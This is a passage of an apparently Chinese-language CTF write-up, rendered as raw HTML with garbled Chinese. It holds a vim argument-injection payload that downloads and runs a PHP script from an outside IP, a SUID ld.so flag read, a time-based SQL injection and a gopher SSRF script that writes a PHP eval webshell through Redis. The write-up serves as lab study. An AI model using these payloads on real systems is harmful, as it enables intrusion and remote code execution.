class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;--help&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">//view the file</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;vim &quot;</span> . <span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curlå‘½ä»¤ä¸‹è½½phpè„šæœ¬åˆ° /tmp</span><br>/?filename=--cmd <span class="hljs-string">&quot;! wget http://30.222.0.114:8888/test.php -O /tmp/a123.php&quot;</span><br><span class="hljs-comment"># æ‰§è¡Œ</span><br>/?filename=--cmd <span class="hljs-string">&quot;! php /tmp/a123.php&quot;</span><br><span class="hljs-comment"># suidææƒï¼Œld-2.31.soæœ‰sæ ‡</span><br>/lib/x86_64-linux-gnu/ld-2.31.so /bin/cat /flag<br></code></pre></td></tr></table></figure><h1 id="photocms"><a href="#photocms" class="headerlink" title="photocms"></a>photocms</h1><p>hintè¯´å¼€äº†redisã€‚</p><p>photo.phpå¯ä»¥è¯»æ–‡ä»¶ï¼Œä¹Ÿå­˜åœ¨sqlæ³¨å…¥:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">clearall</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filepath</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$back</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;back = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">bak</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;back-&gt;<span class="hljs-title function_ invoke__">backup</span>(<span class="hljs-variable">$this</span>-&gt;filepath))&#123;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filepath);<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>        &#125;<br>    &#125;<br>  <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bak</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backup</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;/var/www/back/&quot;</span>.<span class="hljs-variable">$name</span>);<br>  &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;download_url&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;download_url&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>),<span class="hljs-string">&#x27;gopher&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>),<span class="hljs-string">&#x27;phar&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>),<span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>  &#125;<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Transfer-Encoding: binary&#x27;</span> ); <br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Expires: 0&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Cache-Control: must-revalidate&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">ob_clean</span>(); <br>  <span class="hljs-title function_ invoke__">flush</span>(); <br>  <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;/var/www/html/images/&quot;</span>.<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>));<br>  <span class="hljs-keyword">exit</span>; <br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$photo</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=photo&#x27;</span>, <span class="hljs-string">&#x27;photo&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO filelist (filedata) VALUES (&#x27;<span class="hljs-subst">$photo</span>&#x27;)&quot;</span>;<br>        <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;/var/www/html/images/1.jpg&quot;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$photo</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;upload OK&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pdoceshi&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$dbms</span>=<span class="hljs-string">&quot;mysql&quot;</span>;<br>  <span class="hljs-variable">$host</span>=<span class="hljs-string">&#x27;localhost&#x27;</span>;<br>  <span class="hljs-variable">$dbName</span>=<span class="hljs-string">&#x27;photo&#x27;</span>;<br>  <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;photo&#x27;</span>;<br>  <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;root&#x27;</span>;<br>  <span class="hljs-variable">$connectpdo</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pdo&#x27;</span>];<br>  <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-variable">$conne</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$connectpdo</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>);<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$conne</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PDO OK!&quot;</span>;<br>      &#125;<br>  &#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>      <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ å’Œunlinkï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ‰“pharï¼Œä½†æ˜¯æµ‹è¯•åå¥½åƒpharç»™banäº†ã€‚</p><p>index.phpæœ‰file_get_contentsï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;<br>&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;meta name=<span class="hljs-string">&quot;keywords&quot;</span> content=<span class="hljs-string">&quot;Transact Solutions a Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, </span><br><span class="hljs-string">Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design&quot;</span> /&gt;<br>&lt;link href=<span class="hljs-string">&quot;css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>&gt;<br>&lt;link href=<span class="hljs-string">&quot;css/font-awesome.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>&gt;<br>&lt;link href=<span class="hljs-string">&quot;css/style.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>/&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br> &lt;section <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">contact</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">contact</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">h3</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">xyz</span>&quot;&gt;<span class="hljs-title">base64</span>å›¾ç‰‡ç”Ÿæˆç³»ç»Ÿ&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">row</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">col</span>-<span class="hljs-title">lg</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">md</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">sm</span>-6 <span class="hljs-title">dghgffg</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">contactus9</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">base64</span>å›¾ç‰‡é¢„è§ˆ&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">data</span>:<span class="hljs-title">image</span>/<span class="hljs-title">png</span>;<span class="hljs-title">base64</span>,&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">file_get_contents</span>(&#x27;/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">html</span>/<span class="hljs-title">images</span>/1.<span class="hljs-title">jpg</span>&#x27;));?&gt;&quot;/&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">contactus2</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">Download</span>&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">i</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">fa</span> <span class="hljs-title">fa</span>-<span class="hljs-title">flag</span>&quot; <span class="hljs-title">aria</span>-<span class="hljs-title">hidden</span>=&quot;<span class="hljs-title">true</span>&quot;&gt;&lt;/<span class="hljs-title">i</span>&gt; &lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;./<span class="hljs-title">photo</span>.<span class="hljs-title">php</span>?<span class="hljs-title">download_url</span>=<span class="hljs-title">MS5qcGc</span>=&quot;&gt;ç‚¹å‡»ä¸‹è½½&lt;/<span class="hljs-title">a</span>&gt;&lt;<span class="hljs-title">br</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">col</span>-<span class="hljs-title">lg</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">md</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">sm</span>-6 <span class="hljs-title">sdtrthjh</span>&quot;&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">form</span> <span class="hljs-title">action</span>=&quot;./<span class="hljs-title">photo</span>.<span class="hljs-title">php</span>&quot; <span class="hljs-title">method</span>=&quot;<span class="hljs-title">post</span>&quot;&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">contactus10</span>&quot;&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">h3</span>&gt;å›¾ç‰‡ç¼–ç &lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">                        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                            &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">name</span>&quot;&gt;</span><br><span class="hljs-class">                                <span class="hljs-title">base64</span>å›¾ç‰‡&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                            &lt;<span class="hljs-title">textarea</span> <span class="hljs-title">name</span>=&quot;<span class="hljs-title">photo</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">message</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">control</span>&quot; <span class="hljs-title">rows</span>=&quot;9&quot; <span class="hljs-title">cols</span>=&quot;25&quot; <span class="hljs-title">required</span>=&quot;<span class="hljs-title">required</span>&quot;</span><br><span class="hljs-class">                               &gt;&lt;/<span class="hljs-title">textarea</span>&gt;</span><br><span class="hljs-class">                        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">                        &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">btn</span> <span class="hljs-title">btn</span>-<span class="hljs-title">primary</span> <span class="hljs-title">pull</span>-<span class="hljs-title">right</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">btnContactUs</span>&quot;&gt;</span><br><span class="hljs-class">                          ç‚¹å‡»æäº¤&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">                           &lt;/<span class="hljs-title">form</span>&gt; </span><br><span class="hljs-class">  &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  </span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">section</span>&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">map</span>&quot;&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">jquery</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">jquery</span>.<span class="hljs-title">easing</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">move</span>-<span class="hljs-title">top</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">bootstrap</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">grayscale</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">SmoothScroll</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;!-- <span class="hljs-title">projects</span> --&gt;</span><br><span class="hljs-class">$(<span class="hljs-title">document</span>).<span class="hljs-title">ready</span>(<span class="hljs-title">function</span>()</span>&#123;<br>  $(<span class="hljs-string">&quot;[class^=&#x27;thumbnail-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">click</span>(function()&#123;<br>    $(<span class="hljs-string">&quot;[class^=&#x27;thumbnail-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">slideToggle</span>(<span class="hljs-string">&quot;fast&quot;</span>);<br>    $(this).<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-string">&quot;[class^=&#x27;large-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">slideToggle</span>();<br>  &#125;);<br>  <br>  $(<span class="hljs-string">&quot;.close&quot;</span>).<span class="hljs-title function_ invoke__">click</span>(function()&#123;<br>    $(<span class="hljs-string">&quot;[class^=&#x27;large-&#x27;]:visible&quot;</span>).<span class="hljs-title function_ invoke__">toggle</span>();<br>    $(<span class="hljs-string">&quot;[class^=&#x27;thumbnail-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">fadeToggle</span>(<span class="hljs-string">&quot;fast&quot;</span>);; <br>  &#125;); <br>  <br>&#125;);<br><br><span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">WOW</span>().<span class="hljs-title function_ invoke__">init</span>();<br>&lt;/script&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>$(document).<span class="hljs-title function_ invoke__">ready</span>(function() &#123;<br><span class="hljs-keyword">var</span> defaults = &#123;<br>containerID: <span class="hljs-string">&#x27;toTop&#x27;</span>, <span class="hljs-comment">// fading element id</span><br>containerHoverID: <span class="hljs-string">&#x27;toTopHover&#x27;</span>, <span class="hljs-comment">// fading element hover id</span><br>scrollSpeed: <span class="hljs-number">1200</span>,<br>easingType: <span class="hljs-string">&#x27;linear&#x27;</span> <br>&#125;;<br>$().<span class="hljs-title function_ invoke__">UItoTop</span>(&#123; <span class="hljs-attr">easingType</span>: <span class="hljs-string">&#x27;easeOutQuart&#x27;</span> &#125;);<br>&#125;);<br>&lt;/script&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ‰“sqlæ³¨å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">photo<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and (select sleep(3)));#</span><br></code></pre></td></tr></table></figure><p>redis :6379</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs redis">requirepass 79a1c5a9ad7370f0ff80ea96a10a481a<br></code></pre></td></tr></table></figure><p>SSRFï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span>  <span class="hljs-comment"># ä½¿ç”¨çš„åè®®</span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span>   <span class="hljs-comment"># ç›®æ ‡redisçš„ç«¯å£å·</span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php phpinfo();\n@eval($_POST[1]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span>   <span class="hljs-comment"># shellçš„åå­—</span><br>path=<span class="hljs-string">&quot;/var&quot;</span>      <span class="hljs-comment"># å†™å…¥çš„è·¯å¾„</span><br>passwd=<span class="hljs-string">&quot;79a1c5a9ad7370f0ff80ea96a10a481a&quot;</span>   <span class="hljs-comment"># å¦‚æœæœ‰å¯†ç  åˆ™å¡«å…¥</span><br><span class="hljs-comment"># æˆ‘ä»¬çš„æ¶æ„å‘½ä»¤</span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span 